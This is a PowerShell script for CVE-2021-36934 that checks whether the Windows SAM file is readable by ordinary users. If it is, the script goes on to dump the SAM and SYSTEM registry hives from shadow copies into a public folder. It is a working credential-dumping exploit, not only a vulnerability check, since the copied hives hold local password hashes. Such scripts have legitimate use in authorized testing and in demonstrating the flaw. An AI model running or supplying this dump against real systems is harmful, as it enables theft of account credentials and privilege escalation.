[CmdletBinding()]
param(
        $OutDir = "C:\Users\Public\Documents",
        $NumShadows = 99
)

$ACL=icacls "$env:windir\system32\config\sam"

If (($ACL -match "BUILTIN\\Users\:\(I\)\(RX\)").Count -eq 1) {

    Write-Host -ForegroundColor Red "*** System is VULNERABLE to CVE-2021-36934 ***`r`nAttempting to dump SAM file from any Shadow Copies on this system..."

    for($i = 1; $i -le $NumShadows; $i++){
        try {
            [System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sam$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\sam"))
            Write-Host -ForegroundColor Green "Dumping SAM$i hive..."
            [System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sys$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\system"))
            Write-Host -ForegroundColor Green "Dumping SYSTEM$i hive..."
        } catch {}
    }
    if(test-path $OutDir\s*){
        Write-Host -ForegroundColor GReen "SAM and SYSTEM files dumped to $OutDir"
    } else {
        Write-Host -ForegroundColor Yellow "Unable to copy from shadow copies - there may not be any present on this system."
        Write-Host -ForegroundColor Red "This system is still vulnerable!"
    }
} else {
    Write-Host -ForegroundColor Green "System is NOT VULNERABLE to CVE-2021-36934"
}